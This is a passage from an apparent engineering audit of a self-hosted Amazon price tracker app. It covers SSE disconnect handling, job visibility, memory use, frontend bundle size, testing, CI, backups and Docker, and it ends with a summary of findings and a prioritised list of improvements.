res.setHeader('Connection', 'keep-alive');

// No req.on('close', ...) anywhere in this file
```

**Impact:** Writing to a closed connection doesn't crash Node.js (it silently fails), but it wastes resources — the scraper keeps running for a user who's no longer watching. In extreme cases with many disconnected SSE clients, this could accumulate orphaned update processes.

**Example scenario:** A user triggers an update, watches 10% progress, then navigates away. The scraper finishes all 100 products, writing progress events to a dead connection. Meanwhile, the `isUpdating` flag stays true, blocking other users.

**Suggested fix:** Add a close handler with an abort signal:
```typescript
let aborted = false;
req.on('close', () => {
  aborted = true;
  console.log(`Client disconnected, update will continue in background`);
});

// Pass abort check to the update function
schedulerService.updateUserPrices(req.userId, (progress) => {
  if (!aborted) {
    res.write(`data: ${JSON.stringify(progress)}\n\n`);
  }
});
```
Note: The scrape itself should continue (don't waste partial work), but stop writing to the dead connection.

### 5.5 `[Low]` No Admin Visibility Into Running Jobs

**Current behavior:** There's no way for an admin to see which scrape jobs are currently running, queued, or recently completed. The only indication is the `isUpdating` boolean.

**Impact:** When debugging "why can't I update?" or "why are prices stale?", the admin has no tools. They can't see if the scheduler ran, which users were processed, or if any errors occurred — they'd need to SSH in and read console logs.

**Suggested fix:** Add a simple job status endpoint for admins:
```typescript
GET /api/admin/jobs
// Returns:
{
  "running": [{ "userId": 3, "startedAt": "...", "progress": 45 }],
  "recent": [{ "userId": 1, "completedAt": "...", "products": 80, "errors": 2 }]
}
```
Store recent job results in memory (last 50) or in a `job_history` table. Display this in the admin System Stats panel.

### Recommended Next Steps
1. **Immediate:** Replace global `isUpdating` with per-user lock — unblocks multi-user scenarios
2. **Immediate:** Add `req.on('close')` handler to SSE endpoint — prevents writing to dead connections
3. **Short-term:** Decouple scraping from HTTP requests via a simple job queue pattern
4. **Medium-term:** Parallelize user processing in the scheduler (pairs with browser pool from Section 4)
5. **Long-term:** Admin job status endpoint for operational visibility

---

## 6. System Resources

The application runs as a single Node.js process with an embedded Playwright browser. For a small installation (1-5 users), resource usage is reasonable. The concerns below become relevant as the user base grows or when running on resource-constrained hardware (e.g., a Raspberry Pi, small VPS, or shared Tailscale node).

### 6.1 `[Medium]` Playwright Browser Stays Resident in Manual Updates

**Current behavior:** The browser is launched on the first scrape call via `initialize()` and closed after scheduled batch updates in the `finally` block. However, during manual updates triggered via the API, the browser lifecycle depends on when `close()` is called by the scheduler's finally block.

```typescript
// backend/src/services/scraper.ts:8-20
async initialize(): Promise<void> {
  if (!this.browser) {
    this.browser = await firefox.launch({ headless: true });
    this.context = await this.browser.newContext({ ... });
  }
}

// backend/src/services/scheduler.ts:212 — closed in finally block
finally {
  this.isUpdating = false;
  await scraperService.close();
}
```

**Impact:** A headless Firefox instance consumes ~150-300MB of RAM. If the server has limited memory (e.g., a 1GB VPS), this is a significant chunk. Between scheduled runs, the browser is closed. But the manual update path also closes it in the finally block — so the main concern is the peak memory usage during scraping on memory-constrained systems.

**Example scenario:** A Raspberry Pi with 1GB RAM runs the tracker. During a price update, the Playwright browser (~200MB) + Node.js (~100MB) + SQLite leaves only ~700MB free, which can cause swap thrashing or OOM kills.

**Suggested fix:** Add a configurable idle timeout that closes the browser after a period of inactivity:
```typescript
private idleTimer: NodeJS.Timeout | null = null;

async initialize() {
  this.clearIdleTimer();
  if (!this.browser) {
    this.browser = await firefox.launch({ headless: true });
  }
}

private resetIdleTimer() {
  this.clearIdleTimer();
  this.idleTimer = setTimeout(() => this.close(), 60_000); // Close after 1min idle
}
```
Also consider exposing `SCRAPER_MEMORY_LIMIT` to configure Playwright's `--memory-pressure-off` or similar flags.

### 6.2 `[Medium]` No Memory or CPU Monitoring

**Current behavior:** No process monitoring, memory tracking, or health metrics are collected. If the Node.js process runs out of memory or gets OOM-killed by the OS, the only evidence is the process disappearing.

**Impact:** Memory leaks (e.g., from unclosed browser contexts, accumulated event listeners, or growing query result sets) go undetected until the process crashes. On systems managed by `run.sh` (which uses `nohup`), there's no automatic restart — the user discovers the outage manually.

**Example scenario:** A memory leak causes the process to grow from 100MB to 800MB over a week. On day 8, the OOM killer terminates it. The user notices hours later when the dashboard won't load.

**Suggested fix:** Add basic memory tracking to the health endpoint:
```typescript
app.get('/health', (req, res) => {
  const mem = process.memoryUsage();
  res.json({
    status: dbReady ? 'ok' : 'starting',
    memory: {
      rss: Math.round(mem.rss / 1024 / 1024),       // Total MB
      heapUsed: Math.round(mem.heapUsed / 1024 / 1024),
      heapTotal: Math.round(mem.heapTotal / 1024 / 1024),
    },
    uptime: Math.round(process.uptime()),
  });
});
```
For production, use a process manager (PM2) that handles auto-restart and memory limits:
```bash
pm2 start dist/server.js --max-memory-restart 512M
```

### 6.3 `[Medium]` Single-Threaded Node.js

**Current behavior:** The application runs as a single Node.js process. All HTTP requests, scraping, scheduling, and database operations share one thread.

**Impact:** On a multi-core machine, only one core is utilized. CPU-intensive operations (though rare — most work is I/O-bound) block the event loop. More importantly, a long-running synchronous operation (e.g., large JSON serialization for database export) can cause request queuing.

**Example scenario:** An admin exports a large database (100MB). The JSON serialization blocks the event loop for several seconds. During that window, all API requests queue up, making the dashboard appear frozen.

**Suggested fix:** For most deployments, this isn't a bottleneck — the app is I/O-bound (network requests, SQLite queries). If CPU becomes a concern:
1. Use Node.js `cluster` module to fork workers (one per core)
2. Or use PM2's cluster mode: `pm2 start dist/server.js -i max`

**Caveat:** SQLite doesn't support concurrent writers from multiple processes. Clustering would require WAL mode (Section 2.2) and careful write coordination. For most self-hosted installations, single-process is fine.

### 6.4 `[Low]` Log Files Grow Unbounded

**Current behavior:** The `run.sh` script redirects output to `logs/backend.log` and `logs/frontend.log` using `nohup`. These files are never rotated or truncated.

**Impact:** Over months of operation, log files can grow to gigabytes — especially if the scraper logs verbose output for each product (selector fallbacks, price parsing details). This wastes disk space and makes log analysis difficult.

**Example scenario:** After 6 months, `backend.log` is 2GB. The server runs on a 20GB VPS — 10% of disk is used by logs alone.

**Suggested fix:** Use `logrotate` (system-level) or a simple log rotation in `run.sh`:
```bash
# In run.sh, rotate before starting:
if [ -f logs/backend.log ] && [ $(stat -f%z logs/backend.log 2>/dev/null || stat -c%s logs/backend.log) -gt 10485760 ]; then
  mv logs/backend.log logs/backend.log.old
fi
```
Or use PM2 which handles log rotation natively:
```bash
pm2 install pm2-logrotate
pm2 set pm2-logrotate:max_size 10M
```

### Recommended Next Steps
1. **Immediate:** Add memory stats to the `/health` endpoint — zero-cost observability
2. **Short-term:** Use PM2 for production with `--max-memory-restart` and log rotation
3. **Medium-term:** Add idle timeout to the scraper browser to reclaim memory between updates
4. **Deferred:** Clustering — only if CPU becomes a measurable bottleneck

---

## 7. Frontend Performance

The frontend is well-architected with React Query for data fetching (good cache defaults, no refetch-on-focus), route-level code splitting for the heaviest pages, and a custom design system. The main opportunities are around further code splitting, image optimization, and progressive enhancement.

### 7.1 `[Medium]` Eagerly Loaded Components in Initial Bundle

**Current behavior:** Dashboard, Auth, SetupWizard, and AppShell are imported eagerly. Only ProductsPage, ProductDetail, and SettingsPage are lazy-loaded.

```typescript
// frontend/src/App.tsx:4-6, 11 — eagerly imported
import { Dashboard } from './components/Dashboard';
import { Auth } from './components/Auth';
import SetupWizard from './components/SetupWizard';
import { AppShell } from './layout/AppShell';

// frontend/src/App.tsx:14-16 — lazy-loaded
const ProductsPage = lazy(() => import('./components/ProductsPage').then(...));
const ProductDetail = lazy(() => import('./components/ProductDetail').then(...));
const SettingsPage = lazy(() => import('./components/SettingsPage').then(...));
```

**Impact:** The initial JavaScript bundle includes Dashboard (with Recharts chart components) and SetupWizard (only used once, on first run). This increases first-load parse and execute time, especially on mobile devices. Recharts alone can add ~100KB to the initial bundle.

**Example scenario:** A returning user on a slow mobile connection loads the app. The browser must download, parse, and execute the Dashboard code (including Recharts) even though the user might navigate directly to Products via a bookmark.

**Suggested fix:** Lazy-load Dashboard and SetupWizard:
```typescript
const Dashboard = lazy(() => import('./components/Dashboard').then(m => ({ default: m.Dashboard })));
const SetupWizard = lazy(() => import('./components/SetupWizard'));
```
Keep Auth and AppShell eager since they're needed immediately on every page load.

### 7.2 `[Low]` Global CSS Loaded on Every Page

**Current behavior:** `index.css` (~550 lines) is imported in `main.tsx` and loaded in its entirety on every page, regardless of which route the user visits.

**Impact:** While 550 lines of CSS is not large in absolute terms (~15-20KB), it includes styles for components that may not be rendered on the current page. This is a minor inefficiency — the bigger concern is maintainability as the file grows.

**Suggested fix:** This is a low priority optimization. The ongoing migration to CSS Modules is the right long-term approach — as more styles move to `*.module.css` files, `index.css` will naturally shrink to only global reset/variables/utilities. No action needed beyond continuing the current migration.

### 7.3 `[Low]` No Service Worker or PWA Caching

**Current behavior:** The app shows an offline banner when connectivity is lost but cannot serve any cached content. Every page load requires a network connection.

```typescript
// frontend/src/layout/OfflineBanner.tsx — shows status only, no caching
```

**Impact:** Users on intermittent connections (mobile, spotty WiFi) see a blank page or loading state when offline. Price history data they viewed seconds ago is unavailable without a connection. This matters more for a price tracker used on mobile during shopping.

**Suggested fix:** Add a Vite PWA plugin for basic caching:
```bash
npm install vite-plugin-pwa
```
```typescript
// vite.config.ts
import { VitePWA } from 'vite-plugin-pwa';

plugins: [
  VitePWA({
    registerType: 'autoUpdate',
    workbox: {
      runtimeCaching: [
        { urlPattern: /\/api\/products/, handler: 'StaleWhileRevalidate' },
        { urlPattern: /\/api\/dashboard/, handler: 'StaleWhileRevalidate' },
      ],
    },
  }),
]
```
This allows previously viewed data to be served from cache while the app attempts to fetch fresh data in the background.

### 7.4 `[Low]` Product Images Not Lazy-Loaded

**Current behavior:** Product thumbnail images load eagerly — all images in the visible and off-screen product list rows are fetched immediately.

```typescript
// frontend/src/components/ProductList.tsx:407-412
<img
  src={getPreferredProductImageUrl(product)}
  alt={product.description}
  className="product-thumbnail"
  onError={(e) => handleProductImageError(e, product.asin)}
/>
```

**Impact:** On a page with 20 products (default pagination), all 20 thumbnail images are fetched on page load, even if only 5-8 are visible above the fold. Each Amazon product image is typically 50-200KB, so this is 1-4MB of unnecessary immediate downloads.

**Suggested fix:** Add the native `loading="lazy"` attribute:
```typescript
<img
  src={getPreferredProductImageUrl(product)}
  alt={product.description}
  className="product-thumbnail"
  loading="lazy"
  onError={(e) => handleProductImageError(e, product.asin)}
/>
```
This is a one-line change supported by all modern browsers. Images below the fold are only fetched when the user scrolls near them.

### Recommended Next Steps
1. **Immediate:** Add `loading="lazy"` to product images — one-line fix, saves bandwidth
2. **Short-term:** Lazy-load Dashboard component to reduce initial bundle (Recharts is heavy)
3. **Long-term:** Consider PWA caching for offline support if mobile usage is significant
4. **Ongoing:** Continue CSS Modules migration to reduce global CSS

---

## 8. DevOps & Reliability

The application has solid deployment tooling (`install.sh`, `run.sh`) and comprehensive documentation. However, it lacks the automated quality gates and operational infrastructure that protect against regressions and simplify deployment. The absence of automated testing is the single highest-impact gap in the project.

### 8.1 `[High]` No Automated Test Suite

**Current behavior:** The `backend/test/` directory contains debug utilities (`debug-price.ts`, `selector-analyzer.ts`, `verify-price-fixes.ts`) — not automated tests. There is no test framework, no test runner, no test configuration. Zero lines of automated test code exist.

**Impact:** Every code change carries regression risk. The scraper has complex fallback logic (4 price extraction methods, 3 title selectors, multiple availability patterns) that could break silently. Database migrations could lose data. API endpoints could return wrong status codes. All of this must be verified manually for every change.

**Example scenario:** A developer fixes a price parsing bug for one product format but accidentally breaks parsing for another format. Without tests, this goes undetected until a user reports stale prices days later.

**Suggested fix:** Start with high-value, low-effort tests:

1. **Database repo tests** — test CRUD operations, migrations, cascading deletes:
   ```bash
   npm install -D vitest
   ```
   ```typescript
   // backend/test/db/product-repo.test.ts
   import { describe, it, expect, beforeEach } from 'vitest';

   describe('ProductRepo', () => {
     it('should create and retrieve a product', async () => { ... });
     it('should record price history only on change', async () => { ... });
     it('should cascade delete price history when product deleted', async () => { ... });
   });
   ```

2. **Scraper parser tests** — test price/title/availability extraction with saved HTML snapshots:
   ```typescript
   // Test with real Amazon page snapshots (saved as fixtures)
   it('should parse Brazilian Real price format', () => {
     expect(parsePrice('R$ 1.234,56')).toBe(1234.56);
   });
   ```

3. **API route tests** — test auth flow, product CRUD, error responses with supertest

### 8.2 `[Medium]` No CI/CD Pipeline

**Current behavior:** No GitHub Actions, GitLab CI, or other CI configuration exists. Code is pushed directly without automated checks.

**Impact:** TypeScript type errors, broken imports, and syntax errors can be pushed to the repository. There's no automated build verification — a broken commit could go unnoticed until someone pulls and tries to run the app.

**Example scenario:** A developer pushes a commit that passes `npm run dev` (which uses ts-node-dev with lenient settings) but fails `npm run build` (which runs full tsc). The next person who tries to deploy discovers the build is broken.

**Suggested fix:** Add a GitHub Actions workflow:
```yaml
# .github/workflows/ci.yml
name: CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 18 }
      - run: cd backend && npm ci && npm run build
      - run: cd frontend && npm ci && npm run build
      # Add test step once tests exist:
      # - run: cd backend && npm test
```

### 8.3 `[Medium]` No Database Backup Automation

**Current behavior:** Database backups are only available through manual export via the admin panel (GET `/api/config/export-database` — downloads the SQLite file).

**Impact:** If the server's disk fails or the database corrupts, data is lost unless someone remembered to manually export recently. For a price tracker with years of historical data, this is significant.

**Example scenario:** The SQLite file corrupts due to an unclean shutdown during a write (unlikely but possible without WAL mode). The last manual backup was 3 weeks ago — 3 weeks of price history is lost.

**Suggested fix:** Add a scheduled backup job using the existing cron infrastructure:
```typescript
// Add to scheduler.ts
private scheduleBackups() {
  cron.schedule('0 3 * * *', async () => { // Daily at 3 AM
    const backupPath = `database/backups/products-${Date.now()}.db`;
    await fs.copyFile('database/products.db', backupPath);
    // Keep last 7 backups, delete older ones
  });
}
```
Alternatively, use SQLite's `.backup` API for hot backups that don't interfere with running queries.

### 8.4 `[Medium]` No Docker Support

**Current behavior:** Deployment requires manually installing Node.js 18+, running `npm install` (which triggers Playwright browser download), and managing processes with `run.sh` or a process manager.

**Impact:** Setting up a new installation involves multiple steps and system-level dependencies. Playwright browser installation can fail on some Linux distributions due to missing system libraries. There's no reproducible deployment artifact.

**Example scenario:** A user tries to deploy on a minimal Ubuntu server. Playwright's postinstall fails because `libgbm`, `libwoff2`, and other browser dependencies aren't installed. The user spends an hour debugging system library installations.

**Suggested fix:** Add a Dockerfile:
```dockerfile
FROM node:18-slim

# Install Playwright system dependencies
RUN npx playwright install-deps firefox chromium

WORKDIR /app
COPY backend/package*.json backend/
RUN cd backend && npm ci

COPY frontend/package*.json frontend/
RUN cd frontend && npm ci

COPY . .
RUN cd frontend && npm run build
RUN cd backend && npm run build

# Install Playwright browsers
RUN cd backend && npx playwright install firefox chromium

EXPOSE 3000
CMD ["node", "backend/dist/server.js"]
```
Add a `docker-compose.yml` for single-command deployment:
```yaml
services:
  tracker:
    build: .
    ports: ["3000:3000"]
    volumes: ["./database:/app/database"]
    environment:
      - JWT_SECRET=change-me-to-a-random-value
      - NODE_ENV=production
```

### 8.5 `[Low]` No Structured Logging

**Current behavior:** The application uses `console.log` with timestamp prefixes (via `backend/src/utils/logger.ts`). Log output is plain text.

**Impact:** Plain text logs are difficult to parse programmatically. If the application is ever deployed with a log aggregation tool (ELK, Datadog, CloudWatch), parsing custom timestamp formats requires extra configuration. Filtering logs by level (info, warn, error) requires text pattern matching.

**Suggested fix:** Replace the console override with a structured logger like `pino`:
```bash
npm install pino
```
```typescript
import pino from 'pino';
const logger = pino({ level: process.env.LOG_LEVEL || 'info' });

// Usage:
logger.info({ userId: 3, products: 80 }, 'Starting price update');
// Output: {"level":30,"time":1712793600000,"userId":3,"products":80,"msg":"Starting price update"}
```
This is low priority unless log aggregation is needed. The current console approach works fine for reading logs directly.

### 8.6 `[Low]` tsconfig Includes Test Files Outside rootDir

**Current behavior:** The backend `tsconfig.json` sets `rootDir: "src/"` but also includes `test/**/*`. Since test files are outside `src/`, running `tsc` produces errors. This is a pre-existing issue that doesn't affect `npm run dev` (which uses ts-node-dev) but breaks `npm run build`.

**Impact:** Build errors from test file inclusion must be worked around. New developers may be confused by tsc errors that don't affect the running application.

**Suggested fix:** Either:
1. Create a separate `tsconfig.test.json` that extends the base config with a different `rootDir`
2. Or exclude test files from the main tsconfig: `"exclude": ["test"]`

### Recommended Next Steps
1. **Immediate:** Fix tsconfig to exclude test files — removes a long-standing build annoyance
2. **Short-term:** Add basic CI pipeline (GitHub Actions) for build verification on push
3. **Short-term:** Start a test suite with database repo tests (highest value-to-effort ratio)
4. **Medium-term:** Add automated database backups via the scheduler
5. **Medium-term:** Create Dockerfile for reproducible deployment
6. **Long-term:** Structured logging if log aggregation tools are adopted

---

## Summary

| Section | Critical | High | Medium | Low | Total |
|---------|----------|------|--------|-----|-------|
| Security | 0 | 2 | 3 | 1 | 6 |
| Database & Storage | 0 | 1 | 3 | 2 | 6 |
| Backend & API | 0 | 0 | 2 | 3 | 5 |
| Scraper | 0 | 1 | 4 | 2 | 7 |
| Multi-User Concurrency | 0 | 2 | 2 | 1 | 5 |
| System Resources | 0 | 0 | 3 | 1 | 4 |
| Frontend Performance | 0 | 0 | 1 | 3 | 4 |
| DevOps & Reliability | 0 | 1 | 3 | 2 | 6 |
| **Total** | **0** | **7** | **21** | **15** | **43** |

### Top 10 Highest-Impact Improvements

1. **Add rate limiting to auth endpoints** (Security 1.3) — low effort, high security impact
2. **Restrict CORS origins** (Security 1.1) — low effort, closes the biggest security hole
3. **Enable SQLite WAL mode** (Database 2.2) — one line, eliminates read blocking during writes
4. **Add LIMIT to getPriceHistory()** (Database 2.4) — quick fix, big impact on page load
5. **Replace global isUpdating with per-user locks** (Concurrency 5.1) — unblocks multi-user usage
6. **Add `loading="lazy"` to images** (Frontend 7.4) — one-line fix, saves bandwidth
7. **Start an automated test suite** (DevOps 8.1) — highest long-term value investment
8. **Add Helmet for security headers** (Security 1.6) — one dependency, broad protection
9. **Match browser UA to engine** (Scraper 4.5) — reduces detection risk
10. **Add req.on('close') to SSE** (Concurrency 5.4) — prevents resource waste on disconnect
